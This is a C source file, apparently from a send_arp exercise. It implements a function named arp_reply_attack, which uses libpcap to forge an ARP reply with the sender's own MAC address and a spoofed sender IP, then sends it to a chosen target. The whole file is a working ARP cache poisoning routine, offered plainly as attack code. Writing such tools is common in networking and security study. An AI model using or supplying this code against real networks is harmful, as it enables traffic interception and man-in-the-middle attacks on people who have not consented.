#include "send_arp.h"

int arp_reply_attack(char* interface, char * senderIp, char * targetIp, u_char* targetMac)
{
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);

	if (handle == NULL)
	{
		fprintf(stderr, "couldn't open device %s: %s\n", interface, errbuf);
		return -1;
	}

	u_char* packet = (u_char*)calloc(60 ,sizeof(u_char));
	u_char* requestPacket = packet;

	struct ether_header* etherHeader = (ether_header *)requestPacket;
	u_char *mac = get_my_mac_address(interface);

	if (mac == NULL) return -1;

	for(int i = 0; i < 6; i++)
	{
		etherHeader->ether_dhost[i] = targetMac[i];
		etherHeader->ether_shost[i] = mac[i]; // My mac
	}	

	etherHeader->ether_type = htons(ETHERTYPE_ARP);

	requestPacket += sizeof(struct ether_header);
	struct ether_arp *arpHeader = (ether_arp *)requestPacket;

	arpHeader->ea_hdr.ar_hrd = htons(0x0001);
	arpHeader->ea_hdr.ar_pro = htons(ETHERTYPE_IP);
	arpHeader->ea_hdr.ar_hln = 6;
	arpHeader->ea_hdr.ar_pln = 4;
	arpHeader->ea_hdr.ar_op = htons(0x0002);

	for(int i = 0; i < 6; i++)
	{
		arpHeader->arp_sha[i] = mac[i]; // sender hardware address
		arpHeader->arp_tha[i] = targetMac[i]; // target hardware address
	}

	struct sockaddr_in senderAddr;
	inet_pton(AF_INET, senderIp, &senderAddr.sin_addr); // convert IPv4 addresses from text to binary form

	arpHeader->arp_spa[0] = (htonl(senderAddr.sin_addr.s_addr) & 0xff000000) >> 24; // sender protocol address
	arpHeader->arp_spa[1] = (htonl(senderAddr.sin_addr.s_addr) & 0x00ff0000) >> 16;
	arpHeader->arp_spa[2] = (htonl(senderAddr.sin_addr.s_addr) & 0x0000ff00) >> 8;
	arpHeader->arp_spa[3] = htonl(senderAddr.sin_addr.s_addr) & 0x000000ff;

	struct sockaddr_in targetAddr;
	inet_pton(AF_INET, targetIp, &targetAddr.sin_addr);

	arpHeader->arp_tpa[0] = (htonl(targetAddr.sin_addr.s_addr) & 0xff000000) >> 24; // target protocol address
	arpHeader->arp_tpa[1] = (htonl(targetAddr.sin_addr.s_addr) & 0x00ff0000) >> 16;
	arpHeader->arp_tpa[2] = (htonl(targetAddr.sin_addr.s_addr) & 0x0000ff00) >> 8;
	arpHeader->arp_tpa[3] = htonl(targetAddr.sin_addr.s_addr);
	// END : Set ARP header
	// END : Set packet configuration

	pcap_sendpacket(handle, packet, 60);

	free(packet);
	packet = NULL;
	requestPacket = NULL;

	pcap_close(handle);
	return 0;
}

